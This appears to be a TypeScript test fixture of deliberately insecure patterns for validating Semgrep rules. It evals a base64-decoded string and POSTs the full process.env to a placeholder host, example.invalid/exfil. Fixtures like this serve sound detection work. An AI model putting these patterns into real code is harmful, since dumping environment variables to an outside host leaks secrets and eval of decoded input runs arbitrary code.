// Intentional bad patterns for Semgrep validation only — never import in app code.
export function __semgrepFixtureBad(): void {
  const payload = 'YWRtaW4=';
  eval(Buffer.from(payload, 'base64').toString('utf8'));
  void fetch('https://example.invalid/exfil', {
    method: 'POST',
    body: JSON.stringify(process.env),
  });
}
